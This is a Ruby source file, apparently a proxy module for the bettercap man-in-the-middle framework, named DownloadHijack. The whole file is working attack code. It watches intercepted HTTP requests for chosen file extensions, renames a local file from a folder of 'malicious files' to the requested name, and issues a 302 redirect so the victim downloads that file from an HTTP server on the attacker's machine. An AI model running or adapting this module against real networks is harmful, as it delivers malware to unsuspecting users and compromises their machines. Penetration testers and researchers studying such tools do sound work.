=begin
BETTERCAP
Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/
Usage  : bettercap --proxy-module download_hijack.rb --download-hijack-extensions EXT1,EXT2 --download-hijack-path download_hijack/ --download-hijack-port 8042
This project is released under the GPL 3 license.
=end

require 'uri'

class DownloadHijack < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'DownloadHijack',
    'Description' => "Renames local files that match the specified file extension(s), then redirects the victim's download.",
    'Version'     => '1.0.0',
    'Author'      => "laozi999 (github)",
    'License'     => 'GPL3'
  )

  @@hijackExtensions = nil
  @@hijackPath = nil
  @@hijackPort = nil
  @@hijackFiles = nil
  @@hijackFile = nil
  @@hijackFileSize = nil
  @@hijackedFile = nil
  BetterCap::Context.get.options.servers.httpd = true

  def self.on_options(opts)
    opts.on( '--httpd', "Enable HTTP server, default to #{'false'}." ) do
      raise BetterCap::Error, "httpd-server is already in use by DownloadHijack proxy module."
    end
    opts.on( '--httpd-port PORT', "Set HTTP server port, default to #{@httpd_port.to_s}." ) do
      raise BetterCap::Error, "httpd-server is already in use by DownloadHijack proxy module."
    end
    opts.on( '--httpd-path PATH', "Set HTTP server path, default to #{@httpd_path} ." ) do
      raise BetterCap::Error, "httpd-server is already in use by DownloadHijack proxy module."
    end
    opts.on( '--download-hijack-extensions EXT1,EXT2', 'Comma separated list of file extensions to hijack.' ) do |v|
      @@hijackExtensions = v.downcase.split(',').map(&:strip).reject(&:empty?)
    end
    opts.on( '--download-hijack-path PATH', 'Path to folder containing malicious files to be used by httpd-server.' ) do |v|
      @@hijackPath = v
    end
    opts.on( '--download-hijack-port PORT', 'Port to be used by httpd-server.' ) do |v|
      @@hijackPort = v
    end
  end

  def initialize
    raise BetterCap::Error, "No --download-hijack-extensions option specified for the proxy module." if @@hijackExtensions.nil?
    raise BetterCap::Error, "No --download-hijack-path option specified for the proxy module." if @@hijackPath.nil?
    raise BetterCap::Error, "#{@@hijackPath} does not exist." unless Dir.exists?(@@hijackPath)
    BetterCap::Logger.info "[" + "DOWNLOADHIJACK".green + "] Hijacking downloads with the following extension: " + @@hijackExtensions.to_s.upcase.gsub(/[\[\]\"\ "]/,'') + "."
    BetterCap::Logger.info "[" + "DOWNLOADHIJACK".green + "] No --download-hijack-port option specified. Using default port " + "8042".yellow + "." if @@hijackPort.nil?
    @@hijackPort = 8042 if @@hijackPort.nil?
    for @@thisExtension in @@hijackExtensions
      @@hijackFiles = Dir.glob(@@hijackPath + "*.#{@@thisExtension}")
      raise BetterCap::Error, "#{@@hijackPath} is missing a " + "#{@@thisExtension.upcase}" + " file." if @@hijackFiles[0].nil?
      raise BetterCap::Error, "#{@@hijackPath} contains more than one " + "#{@@thisExtension.upcase}" + " file." if @@hijackFiles[1]
    end
    @downloadHijackServer = BetterCap::Network::Servers::HTTPD.new( @@hijackPort, @@hijackPath )
    @downloadHijackServer.start
    BetterCap::Context.get.options.servers.httpd = false
  end

  def on_request(request, response)
    @@hijackedFile = request.path.gsub(/.*\//, '').gsub(/\?.*/, '') # Remove every "/" and everything before it, then remove every "?" and everything after it
    if @@hijackedFile.include?(".")
      for @@thisExtension in @@hijackExtensions
        if @@hijackedFile.include?(".#{@@thisExtension}")
          BetterCap::Logger.info "\nHijacking download...\n"
          BetterCap::Logger.info "   Found".green + " #{@@thisExtension} ".upcase + "extension in url:".green + " http://#{request.host}#{request.path}"
          BetterCap::Logger.info "   Renaming local".green + " #{@@thisExtension} ".upcase + "file to:".green + " #{@@hijackedFile}"
          BetterCap::Logger.info "   Redirecting from:".green + " http://#{request.host}#{request.path} " + "to".green + " http://#{BetterCap::Context.get.iface.ip}:#{@@hijackPort}/#{@@hijackedFile}\n\n"
          @@hijackFiles = Dir.glob(@@hijackPath + "*.#{@@thisExtension}")
          raise BetterCap::Error, "#{@@hijackPath} contains more than one " + "#{@@thisExtension.upcase}" + " file." if @@hijackFiles[1]
          File.rename(@@hijackFiles[0], @@hijackPath + @@hijackedFile)
          @@hijackFileSize = File.read(@@hijackPath + @@hijackedFile).bytesize
          response.status = 302
          response['Content-Disposition'] = "attachment; filename=" + @@hijackedFile
          response['Content-Length'] = @@hijackFileSize
          response['Location'] = "http://#{BetterCap::Context.get.iface.ip}:#{@@hijackPort}/#{@@hijackedFile}"
        end
      end
    end
  end
end
